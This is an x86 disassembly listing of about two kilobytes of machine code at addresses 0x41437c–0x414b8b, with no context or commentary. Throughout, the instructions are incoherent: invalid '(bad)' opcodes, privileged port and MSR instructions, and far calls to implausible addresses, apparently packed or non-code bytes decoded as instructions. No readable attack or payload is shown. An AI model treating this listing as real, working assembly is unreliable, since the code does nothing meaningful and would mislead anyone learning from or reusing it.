  41437c:	cwde   
  41437d:	pop    edx
  41437e:	retf   0x6462
  414381:	pop    ss
  414382:	push   ds
  414383:	xchg   ebp,eax
  414384:	mov    ebx,0x2a8da4ad
  414389:	xlat   BYTE PTR ds:[ebx]
  41438a:	mov    eax,0xbb056c45
  41438f:	stos   DWORD PTR es:[edi],eax
  414390:	or     al,0xff
  414392:	xlat   BYTE PTR ds:[ebx]
  414393:	lods   al,BYTE PTR ss:[si]
  414396:	mov    esp,0x2dc6bf7e
  41439b:	or     BYTE PTR [edi+0x269e2673],ah
  4143a1:	iret   
  4143a2:	fyl2x  
  4143a4:	jmp    0x414376
  4143a6:	sub    DWORD PTR [eax-0x3e],ebx
  4143a9:	sub    bh,cl
  4143ab:	pop    edi
  4143ac:	mov    eax,ds:0xa5eefdfe
  4143b1:	inc    esp
  4143b2:	pop    ecx
  4143b3:	adc    DWORD PTR [ecx+0x16],ecx
  4143b6:	fisubr WORD PTR [ebp+edx*8+0x2a7b2624]
  4143bd:	inc    ebp
  4143be:	and    ebp,DWORD PTR [edx+edi*8-0x1]
  4143c2:	mov    es,WORD PTR [edi+0x64c7111b]
  4143c8:	aas    
  4143c9:	inc    ebp
  4143ca:	ret    
  4143cb:	mov    ?,eax
  4143cd:	int3   
  4143ce:	adc    al,0xed
  4143d0:	pop    eax
  4143d1:	js     0x414381
  4143d3:	or     eax,0x598421e0
  4143d8:	cs popa 
  4143da:	call   0x1652ce2f
  4143df:	mov    ebp,0xc1209c1d
  4143e4:	adc    eax,0x369f492e
  4143e9:	sbb    eax,ebp
  4143eb:	jl     0x414376
  4143ed:	add    al,0x35
  4143ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f0:	mov    bh,0xb1
  4143f2:	das    
  4143f3:	adc    esp,DWORD PTR [esi]
  4143f5:	cmp    DWORD PTR [edx+0x6c8cd747],ecx
  4143fb:	jge    0x414433
  4143fd:	or     ecx,DWORD PTR [ebp-0x22]
  414400:	jmp    0xfd63d1ad
  414405:	nop
  414406:	cmp    BYTE PTR [esi],al
  414408:	call   0xbe4c:0xdb7a1a78
  41440f:	cmp    edx,ecx
  414411:	cmp    eax,0xd5d87b8e
  414416:	push   0x33
  414418:	rcr    DWORD PTR [esi],1
  41441a:	pop    ecx
  41441b:	loope  0x4143e4
  41441d:	in     al,0xef
  41441f:	xor    ecx,DWORD PTR [ebx]
  414421:	push   eax
  414422:	cmc    
  414423:	aaa    
  414424:	fadd   st,st(1)
  414426:	add    ah,0x3c
  414429:	(bad)
  41442c:	or     eax,0xc6c7e2a0
  414431:	fst    QWORD PTR [ebx+ebp*8-0x7af7e0d7]
  414438:	or     DWORD PTR [ecx],eax
  41443a:	sbb    ecx,DWORD PTR gs:[edi]
  41443d:	cwde   
  41443e:	cli    
  41443f:	icebp  
  414440:	mov    dl,BYTE PTR [eax+0x25]
  414443:	mov    bl,0xc9
  414445:	dec    edi
  414446:	icebp  
  414447:	ficomp DWORD PTR ds:0x894af5
  41444d:	or     ah,BYTE PTR [ebx]
  41444f:	shr    BYTE PTR [edx],0x62
  414452:	daa    
  414453:	xor    edi,0xffffffad
  414456:	aad    0x60
  414458:	test   BYTE PTR [ecx+ecx*4+0x4c3194e6],bh
  41445f:	pop    es
  414460:	push   ebp
  414461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414462:	cmp    dh,BYTE PTR [esp+edx*1+0x35]
  414466:	jnp    0xfbb88ba7
  41446c:	(bad)  
  41446d:	jge    0x4144a9
  41446f:	aas    
  414470:	enter  0x6161,0x2f
  414474:	jmp    0xf37fdf74
  414479:	std    
  41447a:	jg     0x414406
  41447c:	sub    ah,al
  41447e:	pop    eax
  41447f:	not    DWORD PTR [ebp+0x1c]
  414482:	test   eax,0xee45d483
  414487:	jp     0x414500
  414489:	push   edi
  41448a:	fdivp  st(0),st
  41448c:	cli    
  41448d:	inc    edx
  41448e:	mov    edi,0xaebc1d84
  414493:	push   eax
  414494:	test   eax,0x693b558d
  414499:	pop    es
  41449a:	mov    eax,ds:0xc96c91c2
  41449f:	(bad)  
  4144a0:	(bad)  [ebx+eiz*1]
  4144a3:	and    BYTE PTR [ecx],0xc6
  4144a6:	xor    al,0x3d
  4144a8:	or     al,0xc6
  4144aa:	mov    ecx,0xefebe67
  4144af:	mov    ds,ebp
  4144b1:	or     DWORD PTR [ebp-0x25],eax
  4144b4:	std    
  4144b5:	or     ecx,DWORD PTR [edi-0x18]
  4144b8:	push   esi
  4144b9:	inc    eax
  4144ba:	bound  eax,QWORD PTR [ebp+eiz*2+0x42bcbdc4]
  4144c1:	cld    
  4144c2:	adc    eax,0x9eed6619
  4144c7:	popf   
  4144c8:	or     edx,DWORD PTR [ebx+0x56]
  4144cb:	jge    0x414507
  4144cd:	sub    BYTE PTR [edi-0x6f77fb76],al
  4144d3:	fwait
  4144d4:	cli    
  4144d5:	int3   
  4144d6:	fisttp WORD PTR [esi]
  4144d8:	in     al,dx
  4144d9:	cmp    esi,DWORD PTR [esi+0x146b442b]
  4144df:	enter  0xcf66,0x4d
  4144e3:	or     eax,0x27ae01c9
  4144e9:	jns    0x414532
  4144eb:	xchg   esp,eax
  4144ec:	mov    WORD PTR [edx-0x12],ds
  4144ef:	ror    DWORD PTR [esi+edx*4+0x7a],1
  4144f3:	dec    esi
  4144f4:	sbb    eax,0xd2e1e0c1
  4144f9:	add    eax,0x6b56aeda
  4144fe:	out    0x27,al
  414500:	jg     0x414559
  414502:	jge    0x4144ee
  414504:	fisttp WORD PTR [edi+0x72]
  414507:	and    al,0xee
  414509:	js     0x414523
  41450b:	mov    ebp,0x40eab0a5
  414510:	mov    esp,DWORD PTR [esi-0x52b1ca2c]
  414516:	pop    ds
  414517:	out    0x68,al
  414519:	fldcw  WORD PTR [edi]
  41451b:	std    
  41451c:	pushf  
  41451d:	mov    dh,0xd7
  41451f:	add    al,0x2f
  414521:	popf   
  414522:	fcom   st(2)
  414524:	pop    esp
  414525:	push   esi
  414526:	sbb    edi,DWORD PTR [eax]
  414528:	bound  esp,QWORD PTR [ecx+edx*1-0x4]
  41452c:	add    eax,0xf7825cd9
  414531:	lock jo 0x4144b9
  414534:	pusha  
  414535:	shl    BYTE PTR [eax+0x5de8e4b8],cl
  41453b:	pop    ebp
  41453c:	inc    ecx
  41453d:	mov    esp,0xa4a37aeb
  414542:	and    edi,DWORD PTR [edi-0x5d3aca32]
  414548:	mov    ecx,0xb42a67c1
  41454d:	add    ebx,esi
  41454f:	push   0x29c876e7
  414554:	mov    BYTE PTR [edx+0x14ce7d1],bh
  41455a:	and    DWORD PTR [edi-0x660157f5],ecx
  414560:	pop    edx
  414561:	xchg   ebx,eax
  414562:	mov    ah,0x6f
  414564:	jl     0x4145e2
  414566:	xor    DWORD PTR [ecx-0x3],ebp
  414569:	xor    edi,esi
  41456b:	imul   esp,DWORD PTR [eax+0x74],0x72891832
  414572:	pop    ebx
  414573:	push   cs
  414574:	mov    ah,0xad
  414576:	jnp    0x414563
  414578:	and    esp,DWORD PTR [esi-0x64]
  41457b:	mov    bh,0xd4
  41457d:	mov    ecx,0xcd90aea0
  414582:	push   edi
  414583:	cwde   
  414584:	xchg   al,al
  414586:	arpl   cx,dx
  414588:	cdq    
  414589:	imul   esi,DWORD PTR [edi+0x4a],0x40
  41458d:	sub    DWORD PTR [eax+0x4e1351ea],esi
  414593:	dec    esi
  414594:	add    al,0x59
  414596:	repnz xchg edi,eax
  414598:	xor    DWORD PTR [esp+edx*2],0xffffffbf
  41459c:	sbb    al,0x20
  41459e:	mov    eax,ds:0x9017e20d
  4145a3:	int    0x0
  4145a5:	sub    eax,0x9ac79d0f
  4145aa:	or     dl,BYTE PTR [edx-0x61]
  4145ad:	jo     0x4145d0
  4145af:	ja     0x414612
  4145b1:	inc    ebp
  4145b2:	inc    edi
  4145b3:	lock or DWORD PTR [ecx],esi
  4145b6:	xor    DWORD PTR [edx-0xc5b0500],ebp
  4145bc:	(bad)  
  4145bd:	icebp  
  4145be:	int    0x7
  4145c0:	jbe    0x41462a
  4145c2:	cdq    
  4145c3:	daa    
  4145c4:	xor    eax,0xcb16d8a6
  4145c9:	pop    esi
  4145ca:	adc    al,0xb4
  4145cc:	cmp    eax,0xb82e6af
  4145d1:	mov    ebx,0x12d9041
  4145d6:	nop
  4145d7:	rol    DWORD PTR [esi],cl
  4145d9:	stos   DWORD PTR es:[edi],eax
  4145da:	(bad)  
  4145db:	neg    DWORD PTR [ebp+0x59]
  4145de:	lea    ebp,[ebx+0x9af4d18]
  4145e4:	fstp   DWORD PTR [esi]
  4145e6:	add    eax,0xa2fa08e
  4145eb:	aam    0xc0
  4145ed:	stc    
  4145ee:	(bad)  
  4145ef:	aad    0xd6
  4145f1:	in     al,0x18
  4145f3:	sbb    DWORD PTR [esi],ebp
  4145f5:	jl     0x4145ab
  4145f7:	in     eax,dx
  4145f8:	xchg   edx,eax
  4145f9:	dec    esi
  4145fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145fb:	sub    eax,0xf5e85dd8
  414600:	mov    edx,DWORD PTR [ebx]
  414602:	dec    eax
  414603:	inc    ebp
  414604:	daa    
  414605:	mov    ebx,0x83eeac49
  41460a:	add    al,0x87
  41460c:	pop    ds
  41460d:	call   0xe141:0x983d6292
  414614:	mov    dl,0x59
  414616:	shr    BYTE PTR [eax-0x33247ecc],1
  41461c:	xor    eax,0x15044331
  414621:	inc    ebp
  414622:	aaa    
  414623:	shr    esp,1
  414625:	lahf   
  414626:	ror    BYTE PTR [edi+eiz*2],1
  414629:	mov    bh,0x81
  41462b:	xor    DWORD PTR [edi+0x61],ebp
  41462e:	push   cs
  41462f:	retf   
  414630:	cwde   
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	test   DWORD PTR [ebx-0x4464b7f5],eax
  414638:	test   BYTE PTR [ebx-0x79b423ec],0xca
  41463f:	(bad)  
  414640:	adc    al,0x50
  414642:	xor    BYTE PTR [ebx-0x1e1bfc03],dh
  414648:	in     eax,0xd3
  41464a:	aad    0x1b
  41464c:	inc    ebx
  41464d:	dec    esi
  41464e:	pushf  
  41464f:	int3   
  414650:	outs   dx,DWORD PTR ds:[esi]
  414651:	mov    ebp,0xca918142
  414656:	dec    eax
  414657:	jbe    0x41467e
  414659:	(bad)  
  41465b:	and    ch,BYTE PTR [eax]
  41465d:	jmp    0xeb3c:0xf41ec522
  414664:	sar    DWORD PTR gs:[esi],1
  414667:	imul   ch
  414669:	icebp  
  41466a:	neg    DWORD PTR [ebp+0x1dc9e67]
  414670:	xchg   ebx,eax
  414671:	cs mov bh,0x83
  414674:	mov    bl,0x41
  414676:	or     BYTE PTR [ecx+0x6e],al
  414679:	pop    edi
  41467a:	sahf   
  41467b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41467c:	push   eax
  41467d:	frstor [esi]
  41467f:	out    dx,al
  414680:	arpl   cx,sp
  414682:	and    BYTE PTR [eax+0x186c7f13],bh
  414688:	jne    0x414640
  41468a:	mov    edi,0xcf16cd23
  41468f:	(bad)  
  414690:	pop    edx
  414691:	push   ss
  414692:	fmulp  st(4),st
  414694:	adc    cl,BYTE PTR [edi+0x33]
  414697:	jp     0x4146a9
  414699:	dec    edx
  41469a:	xor    bh,BYTE PTR ds:0x4641300
  4146a0:	mov    ds:0xf8e2ef11,eax
  4146a5:	dec    ebp
  4146a6:	icebp  
  4146a7:	shl    BYTE PTR [edx-0x167bda11],cl
  4146ad:	inc    ecx
  4146ae:	cmp    bl,BYTE PTR [eax+edi*1-0x34]
  4146b2:	data16 std 
  4146b4:	fcom   QWORD PTR [bp+si+0x5b]
  4146b8:	leave  
  4146b9:	adc    ebp,DWORD PTR [ebx+0x703be8ed]
  4146bf:	jae    0x41470a
  4146c1:	sub    eax,0x2e840c99
  4146c6:	mul    BYTE PTR [eax+0x62e0125b]
  4146cc:	mov    esp,0x93136b58
  4146d1:	sub    BYTE PTR [si-0x4d],bh
  4146d5:	jae    0x414712
  4146d7:	test   eax,0x78ae4289
  4146dc:	lods   al,BYTE PTR ds:[esi]
  4146dd:	jbe    0x4146ef
  4146df:	hlt    
  4146e0:	and    BYTE PTR [edx+0x43d4ce0c],dh
  4146e6:	jb     0x41474a
  4146e8:	cmc    
  4146e9:	clc    
  4146ea:	jne    0x4146e2
  4146ec:	ffreep st(7)
  4146ee:	pop    eax
  4146ef:	push   ds
  4146f0:	jbe    0x414701
  4146f2:	in     eax,dx
  4146f3:	mov    bh,0xa0
  4146f5:	dec    ebp
  4146f6:	fs test al,0x98
  4146f9:	xchg   edx,ebp
  4146fb:	jecxz  0x414694
  4146fd:	inc    eax
  4146fe:	call   0xc2a2:0x9c123ec4
  414705:	fnstenv [edi+ecx*8+0x20]
  414709:	push   esp
  41470a:	push   ebx
  41470b:	push   esi
  41470c:	sub    BYTE PTR ds:0x5d572b9a,bh
  414712:	mov    dl,0xa7
  414714:	out    0x1d,al
  414716:	les    eax,FWORD PTR [ebp+esi*2-0xa]
  41471a:	shl    DWORD PTR [esi+0x72],0xb9
  41471e:	mov    edx,0xa5157f67
  414723:	adc    eax,0x36c559f0
  414728:	mov    ds,WORD PTR gs:[esi-0x62]
  41472c:	xchg   ecx,eax
  41472d:	imul   edx,DWORD PTR [eax-0x7739cf70],0x73
  414734:	mov    ah,0xf1
  414736:	sub    DWORD PTR [edx+0x494f9b09],esi
  41473c:	ss syscall 
  41473f:	and    BYTE PTR [eax-0x3b],al
  414742:	aam    0x6
  414744:	sub    esi,DWORD PTR [eax]
  414746:	fsub   DWORD PTR [edi+ebp*8+0x72373861]
  41474d:	retf   
  41474e:	pop    edx
  41474f:	jg     0x414765
  414751:	repz jne 0x414787
  414754:	dec    edi
  414755:	clc    
  414756:	aaa    
  414757:	pop    ss
  414758:	inc    edx
  414759:	gs ret 0xe7e1
  41475d:	shl    DWORD PTR [esi],0x35
  414760:	or     eax,0xa464b6ef
  414765:	push   esp
  414766:	repz stc 
  414768:	jo     0x414718
  41476a:	dec    eax
  41476b:	mov    ecx,0x7b729c64
  414770:	and    ebp,ebp
  414772:	xor    dl,bl
  414774:	or     DWORD PTR [ecx-0xc],ebp
  414777:	cmp    al,al
  414779:	dec    eax
  41477a:	inc    ebx
  41477b:	mov    esp,0x30350586
  414780:	inc    esi
  414781:	sti    
  414782:	fs mov esp,ebp
  414785:	data16 jb 0x41470e
  414788:	cmp    ch,BYTE PTR [ebx-0x5516b83b]
  41478e:	mov    BYTE PTR [ebx+0x5a],cl
  414791:	and    esp,DWORD PTR [eax]
  414793:	sub    ch,BYTE PTR [ecx-0x2e22f6a7]
  414799:	in     al,0x4d
  41479b:	je     0x41479f
  41479d:	jmp    0x328b3157
  4147a2:	aas    
  4147a3:	inc    edi
  4147a4:	sub    DWORD PTR [edi+edx*4],0x2bcb68e0
  4147ab:	xchg   ebp,eax
  4147ac:	lods   eax,DWORD PTR ds:[esi]
  4147ad:	mov    ecx,0x3c37bc1
  4147b2:	xchg   ecx,eax
  4147b3:	scas   al,BYTE PTR es:[edi]
  4147b4:	out    dx,al
  4147b5:	inc    ecx
  4147b6:	mov    ah,0x65
  4147b8:	or     eax,0x35bab69a
  4147bd:	lds    edx,FWORD PTR [esp+ebp*4]
  4147c0:	bound  ebx,QWORD PTR ds:0x3b2d5f4c
  4147c6:	jp     0x4147cd
  4147c8:	jne    0x414838
  4147ca:	mov    edi,0xf72b79ac
  4147cf:	(bad)  
  4147d0:	mov    BYTE PTR [ecx-0x60bd46c1],dl
  4147d6:	out    dx,al
  4147d7:	jno    0x4147d3
  4147d9:	fwait
  4147da:	out    dx,al
  4147db:	xchg   esp,eax
  4147dc:	jno    0x414803
  4147de:	fnsave [ebp-0x25c30daa]
  4147e4:	stos   DWORD PTR es:[edi],eax
  4147e5:	cmp    al,0xd7
  4147e7:	push   cs
  4147e8:	lock ret 0xb0f1
  4147ec:	shl    DWORD PTR [eax-0x30],0xf2
  4147f0:	mov    al,0x2
  4147f2:	or     dh,ah
  4147f4:	cli    
  4147f5:	test   DWORD PTR [esi],0x4d0d0a8d
  4147fb:	push   edi
  4147fc:	retf   
  4147fd:	dec    edi
  4147fe:	push   ecx
  4147ff:	inc    eax
  414800:	adc    al,0x2f
  414802:	fwait
  414803:	xor    bl,0x1d
  414806:	dec    esi
  414807:	xor    BYTE PTR [ebp+0xb3515a5],dh
  41480d:	adc    ebp,DWORD PTR [eax]
  41480f:	sbb    eax,0xc3a57ad8
  414814:	xchg   esp,eax
  414815:	sub    eax,0x74064ea2
  41481a:	(bad)  
  41481c:	push   eax
  41481d:	mov    dh,cl
  41481f:	iret   
  414820:	mov    bh,BYTE PTR [edx+0x15]
  414823:	mov    esi,0x1b2c3f66
  414828:	or     ch,al
  41482a:	(bad)  
  41482b:	xor    al,0xa7
  41482d:	xlat   BYTE PTR ds:[ebx]
  41482e:	pusha  
  41482f:	pop    edi
  414830:	inc    esp
  414831:	ja     0x4147e1
  414833:	xchg   ebx,eax
  414834:	cmp    eax,0x1347f1b9
  414839:	push   ss
  41483a:	xchg   DWORD PTR [edi+0x3ec603f8],esi
  414840:	loopne 0x4148a5
  414842:	inc    esi
  414843:	call   0x1c66:0x53fd3ea1
  41484a:	pop    ecx
  41484b:	das    
  41484c:	stos   DWORD PTR es:[edi],eax
  41484d:	(bad)  
  41484e:	outs   dx,BYTE PTR ds:[esi]
  41484f:	jmp    0x51b168fd
  414854:	out    dx,al
  414855:	push   esi
  414856:	or     cl,BYTE PTR [edi]
  414858:	cdq    
  414859:	push   ds
  41485a:	ja     0x414857
  41485c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41485d:	or     al,0x30
  41485f:	or     eax,0x1ebe4d92
  414864:	pop    esp
  414865:	gs pop ds
  414867:	fadd   QWORD PTR [edi+0x5fef70f4]
  41486d:	xchg   esi,eax
  41486e:	and    esi,DWORD PTR [ebx]
  414870:	inc    ebx
  414871:	jecxz  0x4148e5
  414873:	jae    0x41481b
  414875:	jg     0x414809
  414877:	repz das 
  414879:	or     eax,0x1b670c8
  41487e:	inc    eax
  41487f:	into   
  414880:	push   eax
  414881:	out    0xea,al
  414883:	jno    0x414807
  414885:	stc    
  414886:	jmp    0xbf67:0xaee7ace7
  41488d:	bnd jne 0x4148c8
  414890:	sub    BYTE PTR [esi],al
  414892:	and    BYTE PTR [ecx-0x362fd849],ch
  414898:	(bad)  
  414899:	cld    
  41489a:	add    esp,DWORD PTR [ebp-0x5a]
  41489d:	push   ebp
  41489e:	cmp    DWORD PTR [edi],edi
  4148a0:	inc    eax
  4148a1:	mov    ss,ebx
  4148a3:	jle    0x41490d
  4148a5:	(bad)  
  4148a6:	fsubr  DWORD PTR [ebx+0x6a0856de]
  4148ac:	xchg   esp,eax
  4148ad:	inc    ebx
  4148ae:	addr16 out 0xee,eax
  4148b1:	stc    
  4148b2:	dec    eax
  4148b3:	ins    BYTE PTR es:[edi],dx
  4148b4:	in     al,0x9d
  4148b6:	adc    edi,esi
  4148b8:	push   ss
  4148b9:	bound  ecx,QWORD PTR [edi+0x4fade457]
  4148bf:	fisub  DWORD PTR [edi+esi*1+0x3bae156d]
  4148c6:	push   cs
  4148c7:	adc    edx,DWORD PTR [ebx-0x6a]
  4148ca:	mov    ebx,0x3311596c
  4148cf:	pop    esp
  4148d0:	xchg   edx,eax
  4148d1:	cmp    al,BYTE PTR [edi]
  4148d3:	adc    dl,ch
  4148d5:	pusha  
  4148d6:	lahf   
  4148d7:	inc    ebx
  4148d8:	mov    al,0x74
  4148da:	mov    ds:0xca8948bc,eax
  4148df:	xor    ebx,DWORD PTR [ecx-0x73]
  4148e2:	xchg   edi,eax
  4148e3:	imul   eax,DWORD PTR [ebx],0xffffffd1
  4148e6:	inc    esp
  4148e7:	addr16 sub eax,edx
  4148ea:	and    DWORD PTR [esi+0x568fe450],esp
  4148f0:	sub    ebp,ecx
  4148f2:	(bad)  
  4148f3:	or     dl,BYTE PTR [ebx]
  4148f5:	in     eax,dx
  4148f6:	fs pop esp
  4148f8:	add    eax,0x11d81df6
  4148fd:	mov    edi,0x9def6577
  414902:	xor    al,0xc2
  414904:	mov    eax,ds:0xd60d4011
  414909:	jmp    0x414899
  41490b:	out    0xb1,eax
  41490d:	dec    edx
  41490e:	wrmsr  
  414910:	fmul   DWORD PTR [ebx-0x36]
  414913:	dec    edi
  414914:	push   es
  414915:	inc    ebx
  414916:	nop
  414917:	or     cl,BYTE PTR [esi+0x2e2e858f]
  41491d:	inc    edx
  41491e:	ins    BYTE PTR es:[edi],dx
  41491f:	jb     0x414931
  414921:	pop    ds
  414922:	xchg   ebp,eax
  414923:	dec    eax
  414924:	push   ebp
  414925:	xchg   ebp,eax
  414926:	repz hlt 
  414928:	scas   al,BYTE PTR es:[edi]
  414929:	fnstcw WORD PTR [edx-0x4611eb62]
  41492f:	mov    gs,WORD PTR [eax+0x71]
  414932:	lds    ecx,FWORD PTR [ecx]
  414934:	scas   al,BYTE PTR es:[edi]
  414935:	sbb    eax,0x10427c60
  41493a:	cwde   
  41493b:	ret    
  41493c:	dec    ecx
  41493d:	mov    esi,ebp
  41493f:	je     0x4148c8
  414941:	and    eax,0x44a3bae4
  414946:	les    ebx,FWORD PTR gs:[edx+0x791df722]
  41494d:	mov    ebp,0x3cad3065
  414952:	jmp    FWORD PTR [ebp-0x13d6d538]
  414958:	ret    0x37d0
  41495b:	cmp    dl,BYTE PTR [ebx-0x76a8c04]
  414961:	push   0x5c
  414963:	retf   0x8e86
  414966:	inc    eax
  414967:	dec    ebx
  414968:	cmp    al,0xb1
  41496a:	lock mov eax,gs
  41496d:	fisubr DWORD PTR [edx-0x70]
  414970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414971:	inc    edi
  414972:	pop    edi
  414973:	lahf   
  414974:	dec    esi
  414975:	sar    DWORD PTR [edi+ebx*8],cl
  414978:	xor    DWORD PTR [edi+0x7dd34a85],ebx
  41497e:	dec    ebp
  41497f:	or     ch,BYTE PTR [ebp+0x344a739b]
  414985:	cmc    
  414986:	inc    esi
  414987:	jecxz  0x41498c
  414989:	jb     0x414969
  41498b:	jnp    0x4149e0
  41498d:	lods   al,BYTE PTR ds:[esi]
  41498e:	jne    0x414973
  414990:	jae    0x4149e3
  414992:	push   edx
  414993:	inc    ecx
  414994:	fld    TBYTE PTR [ecx]
  414996:	out    0xd3,al
  414998:	push   esp
  414999:	jno    0x4149e1
  41499b:	test   al,0xee
  41499d:	cmp    DWORD PTR [ebx+0x1e],edx
  4149a0:	bound  esi,QWORD PTR [esi+ebp*4-0x312afd4d]
  4149a7:	enter  0xc31f,0xf5
  4149ab:	(bad)  
  4149ad:	in     al,0x9e
  4149af:	hlt    
  4149b0:	in     al,dx
  4149b1:	scas   al,BYTE PTR es:[edi]
  4149b2:	and    ecx,edi
  4149b4:	cmp    esp,0x2af2acc0
  4149ba:	daa    
  4149bb:	repnz xchg edx,eax
  4149bd:	push   edx
  4149be:	dec    esi
  4149bf:	or     esi,DWORD PTR [edx+0xf314807]
  4149c5:	add    DWORD PTR [ebp-0x24],ecx
  4149c8:	mov    ah,0x16
  4149ca:	inc    ebp
  4149cb:	sub    esp,DWORD PTR [ebx-0x1a]
  4149ce:	fwait
  4149cf:	rcl    BYTE PTR ds:0x4dea7308,cl
  4149d5:	jg     0x4149f6
  4149d7:	jp     0x414a24
  4149d9:	mov    bl,0xc3
  4149db:	test   al,0x26
  4149dd:	call   0x26a9117
  4149e2:	scas   al,BYTE PTR es:[edi]
  4149e3:	inc    ebx
  4149e4:	arpl   sp,si
  4149e6:	adc    edi,ebp
  4149e8:	(bad)  
  4149e9:	jno    0x4149e0
  4149eb:	or     ebx,DWORD PTR [ebx-0x2b]
  4149ee:	or     esi,edi
  4149f0:	popa   
  4149f1:	inc    eax
  4149f2:	sar    BYTE PTR [ebx-0x3b],0x8f
  4149f6:	cli    
  4149f7:	mov    BYTE PTR [eax+0x6f],0xc7
  4149fb:	mov    edx,0xb67d32df
  414a00:	add    dh,BYTE PTR [ebx]
  414a02:	inc    ebp
  414a03:	pop    ecx
  414a04:	or     DWORD PTR [eax+0x68ddbbfb],0x2d
  414a0b:	jecxz  0x41499d
  414a0d:	cld    
  414a0e:	in     al,dx
  414a0f:	into   
  414a10:	rcl    BYTE PTR [eax+0x2ca50939],0x80
  414a17:	or     eax,DWORD PTR [edi+0x54756bdf]
  414a1d:	jmp    0xd4d8:0x97c506b7
  414a24:	call   0x86dcaca7
  414a29:	int3   
  414a2a:	ins    BYTE PTR es:[edi],dx
  414a2b:	mov    dl,BYTE PTR [edi+0x33c0cb29]
  414a31:	je     0x414a2f
  414a33:	gs les si,DWORD PTR gs:[ecx+0x51]
  414a39:	lds    ebp,FWORD PTR [ebp-0x12923ecf]
  414a3f:	fimul  WORD PTR [ecx-0x449e63c7]
  414a45:	jbe    0x414a4a
  414a47:	mov    ecx,0x131af2f1
  414a4c:	lods   eax,DWORD PTR ds:[esi]
  414a4d:	pop    ebp
  414a4e:	inc    edi
  414a4f:	mov    edi,0x5b9d9888
  414a54:	inc    eax
  414a55:	mov    al,0xc8
  414a57:	out    dx,al
  414a58:	mov    ecx,0xdb366b63
  414a5d:	sbb    eax,0x8c098c89
  414a62:	mov    al,0x23
  414a64:	mov    bl,0x19
  414a66:	dec    eax
  414a67:	data16 jge 0x4149fe
  414a6a:	or     eax,0x822fa87d
  414a6f:	and    esi,edi
  414a71:	inc    edi
  414a72:	int    0xe
  414a74:	ret    
  414a75:	mov    ah,BYTE PTR [edx+edx*8-0x2f]
  414a79:	mov    bh,0xbd
  414a7b:	inc    edx
  414a7c:	loopne 0x414ad8
  414a7e:	push   ecx
  414a7f:	adc    eax,0x894c4686
  414a84:	(bad)  
  414a85:	(bad)  
  414a86:	inc    ebx
  414a87:	in     al,0x22
  414a89:	mov    WORD PTR [edx-0x1653c950],ds
  414a8f:	sbb    eax,0xa0afac81
  414a94:	hlt    
  414a95:	fadd   DWORD PTR [edi+ecx*4+0x33]
  414a99:	int3   
  414a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a9b:	je     0x414a21
  414a9d:	lds    ebx,FWORD PTR [edi-0x3f1bfdc3]
  414aa3:	test   DWORD PTR [edi],ecx
  414aa5:	xchg   esi,eax
  414aa6:	push   0xffffffa3
  414aa8:	jnp    0x414a6b
  414aaa:	pop    ecx
  414aab:	xor    eax,0x321abe6f
  414ab0:	bound  ebp,QWORD PTR [edi-0x1ae7ba3f]
  414ab6:	sbb    eax,0xfac45064
  414abb:	cmp    DWORD PTR [ebx],ebp
  414abd:	jle    0x414a7e
  414abf:	push   edi
  414ac0:	mov    cl,0xf7
  414ac2:	push   esp
  414ac3:	push   edi
  414ac4:	jne    0x414ae5
  414ac6:	pop    ecx
  414ac7:	js     0x414b14
  414ac9:	fneni(8087 only) 
  414acb:	in     al,0xe
  414acd:	inc    edi
  414ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414acf:	mov    eax,ebx
  414ad1:	outs   dx,DWORD PTR ds:[esi]
  414ad2:	push   ebp
  414ad3:	adc    bh,BYTE PTR [ebx-0x34b5e5ad]
  414ad9:	stos   DWORD PTR es:[edi],eax
  414ada:	icebp  
  414adb:	bound  esp,QWORD PTR [esp+ebx*2]
  414ade:	push   eax
  414adf:	push   ebp
  414ae0:	cmp    al,0xe
  414ae2:	inc    edx
  414ae3:	push   esp
  414ae4:	cmp    DWORD PTR [eax-0x2e],edi
  414ae7:	push   0xffffff83
  414ae9:	mov    esi,0xa4b7216b
  414aee:	pop    es
  414aef:	xchg   esp,eax
  414af0:	cdq    
  414af1:	pop    eax
  414af2:	fidiv  DWORD PTR [esi-0x7a]
  414af5:	hlt    
  414af6:	sub    ebx,DWORD PTR [edi+0x3906f96f]
  414afc:	xchg   edx,eax
  414afd:	sbb    cl,dl
  414aff:	repz pop ds
  414b01:	adc    esp,DWORD PTR [edi+esi*4]
  414b04:	call   0x2f0a:0xacdfd95b
  414b0b:	jp     0x414b77
  414b0d:	push   ds
  414b0e:	mov    edx,0xd90149dd
  414b13:	out    0x6a,al
  414b15:	mov    al,0xe0
  414b17:	dec    eax
  414b18:	or     dh,cl
  414b1a:	(bad)  
  414b1b:	jo     0x414b58
  414b1d:	(bad)  
  414b1e:	out    dx,eax
  414b1f:	sbb    al,0x4e
  414b21:	jnp    0x414b4d
  414b23:	mov    ds:0x112a6c7,al
  414b28:	rcl    BYTE PTR [eax+ebx*8-0x4526e7c9],1
  414b2f:	jnp    0x414abe
  414b31:	push   0xffffffda
  414b33:	mov    ebp,0x3bbe9f1e
  414b38:	outs   dx,DWORD PTR ds:[esi]
  414b39:	and    ecx,DWORD PTR [eax+0x3e374299]
  414b3f:	adc    dh,BYTE PTR es:[ecx+ecx*1+0x2cb513c7]
  414b47:	adc    edx,DWORD PTR [edi+eax*2-0x7eec7dd8]
  414b4e:	sub    al,0x77
  414b50:	rol    BYTE PTR [edi+0xf6f93d0],1
  414b56:	inc    edi
  414b57:	pusha  
  414b58:	fwait
  414b59:	inc    ebp
  414b5a:	rcr    DWORD PTR [edi-0x35127a7],1
  414b60:	retf   
  414b61:	fwait
  414b62:	out    0x43,eax
  414b64:	sub    eax,0x4e1b7da6
  414b69:	mov    ch,0x66
  414b6b:	or     eax,0xa2074220
  414b70:	xchg   edi,eax
  414b71:	(bad)  
  414b72:	fld    TBYTE PTR [edi+ebx*4]
  414b75:	nop
  414b76:	cmc    
  414b77:	hlt    
  414b78:	add    DWORD PTR [ebx+edx*8+0x3ef04472],0x415e0b01
  414b83:	or     eax,0x7dfa192f
  414b88:	or     ch,BYTE PTR [ebx+0x2c]
  414b8b:	push   esi
